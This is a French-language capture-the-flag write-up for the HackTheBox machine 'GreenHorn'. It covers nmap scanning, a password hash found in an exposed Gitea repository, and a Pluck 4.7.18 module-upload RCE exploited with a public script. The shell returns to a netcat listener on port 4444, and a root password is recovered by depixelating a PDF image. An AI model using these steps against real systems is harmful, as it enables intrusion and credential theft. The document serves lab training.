# ROOM : GreenHorn
## Infos
Une room **easy** de HackTheBox. pour le fun :)

# Enumeration
Premier vu sur le site, il s'agit un site basé sur le CMS **Pluck**

## NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 09:07 EDT
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-title: Welcome to GreenHorn ! - GreenHorn
|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
|_http-generator: pluck 4.7.18
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
|_http-trane-info: Problem with XML parsing of /evox/about
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=b57a879b1b67913a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=5topSE-8CQl8DOdTeDJblCKWfF86MTcyNDY3NzY0ODUzMTIxNTA4MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 26 Aug 2024 13:07:28 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=2038fe9d13d90b5e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=AtYTaoi789TtWZbZfO9tzMS-NGw6MTcyNDY3NzY1Mzg4NzQ4NTc0Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 26 Aug 2024 13:07:33 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=8/26%Time=66CC7E10%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,34B8,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=b57a879b1b67913a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=5topSE-8CQl8DOdTeDJblCKWfF86MTcyNDY3NzY0ODUzMTIxNTA4MA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2026\x20Aug\x202024\x2013:07:28\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,
SF:\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_li
SF:ke_gitea=2038fe9d13d90b5e;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20_csrf=AtYTaoi789TtWZbZfO9tzMS-NGw6MTcyNDY3NzY1Mzg4NzQ4NTc
SF:0Mw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fra
SF:me-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2026\x20Aug\x202024\x2013:0
SF:7:33\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.74 seconds
```

Le port 80 pointe vers **Pluck** (pluck 4.7.18)
Le port 3000 vers un Gitea (un git local)

## Feroxbuster
On change un peu, on va travailler avec Feroxbuster un peu pour test !
```
200      GET      452l      799w     7310c http://greenhorn.htb/data/styleadmin.css
200      GET        1l       12w    16118c http://greenhorn.htb/data/image/favicon.ico
200      GET        1l        4w       48c http://greenhorn.htb/data/
200      GET        2l     5449w   363860c http://greenhorn.htb/data/modules/tinymce/tinymce.min.js
200      GET      112l      366w     4026c http://greenhorn.htb/admin.php
200      GET      112l      362w     4035c http://greenhorn.htb/install.php
200      GET       19l       38w      321c http://greenhorn.htb/files/.htaccess
200      GET       31l      103w     1242c http://greenhorn.htb/login.php
200      GET       35l      277w     1819c http://greenhorn.htb/README.md
```
# Exploitation
Sur **Gitea** on peu créer un compte, on va donc se faire un compte. Une fois connecter, on retrouve un depot avec l'installation de **Pluck** dessus.

En farfouillant dans les dossiers je trouve **data/settings/pass.php**
```pass.php
d5443aef1b6454[...]689b6b39024d7790163
```
Ce hash est en SHA512 et c'est un mot de passe : **[REDACTED]** et il s'agit du mot de passe de **Pluck** !

La version de **Pluck** est la **4.7.18** et celle-ci est vulnérable à une RCE en exploitant l'ajout de module.

On va donc ajouter notre shell dans une archive zip, puis l'uploader sur **Pluck**. Un script python est dispo afin d'exploiter cette vulnérabilité plus facilement.
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/GreenHorn]
└─$ python3 51592.py
ZIP file path: /home/kali/Challenge/HackTheBox/GreenHorn/mirabbas.zip
Login account
ZIP file download.
<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```
et nous voila avec un shell :
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/GreenHorn]
└─$ nc -lnvp 4444                           
listening on [any] 4444 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.25] 44888
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:04:28 up  6:02,  0 users,  load average: 0.05, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
# Post-Exploitation
Nous sommes connecté en tant que **www-data**. On va devoir changer de compte et passer sur le compte de **junior**.
Simple, c'est le même mot de passe que **Pluck**

## PRIVESC TO ROOT 

Il y a fichier PDF dans le dossier **/home/junior**.
je le télécharge et regarde, dedans il ya un password mais pixélisé. On va voir pour retirer ca.

avec l'outil **pdfimages** je convertie le PDF en images.

Ensuite avec **Depix** on va pouvoir deplixeliser l'image

```
┌──(kali㉿kali)-[~/Tools/Depix]
└─$ python3 depix.py \
    -p ~/Challenge/HackTheBox/GreenHorn/greenhorn-000.ppm \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o ~/Challenge/HackTheBox/GreenHorn/output.png
2024-08-27 09:59:57,503 - Loading pixelated image from /home/kali/Challenge/HackTheBox/GreenHorn/greenhorn-000.ppm
2024-08-27 09:59:57,525 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-08-27 09:59:58,163 - Finding color rectangles from pixelated space
2024-08-27 09:59:58,164 - Found 252 same color rectangles
2024-08-27 09:59:58,164 - 190 rectangles left after moot filter
2024-08-27 09:59:58,164 - Found 1 different rectangle sizes
2024-08-27 09:59:58,164 - Finding matches in search image
2024-08-27 09:59:58,164 - Scanning 190 blocks with size (5, 5)
2024-08-27 09:59:58,189 - Scanning in searchImage: 0/1674
2024-08-27 10:00:41,917 - Removing blocks with no matches
2024-08-27 10:00:41,917 - Splitting single matches and multiple matches
2024-08-27 10:00:41,922 - [16 straight matches | 174 multiple matches]
2024-08-27 10:00:41,922 - Trying geometrical matches on single-match squares
2024-08-27 10:00:42,182 - [29 straight matches | 161 multiple matches]
2024-08-27 10:00:42,182 - Trying another pass on geometrical matches
2024-08-27 10:00:42,423 - [41 straight matches | 149 multiple matches]
2024-08-27 10:00:42,423 - Writing single match results to output
2024-08-27 10:00:42,424 - Writing average results for multiple matches to output
2024-08-27 10:00:44,985 - Saving output image to: /home/kali/Challenge/HackTheBox/GreenHorn/output.png
```
Et nous avons le mdp root.
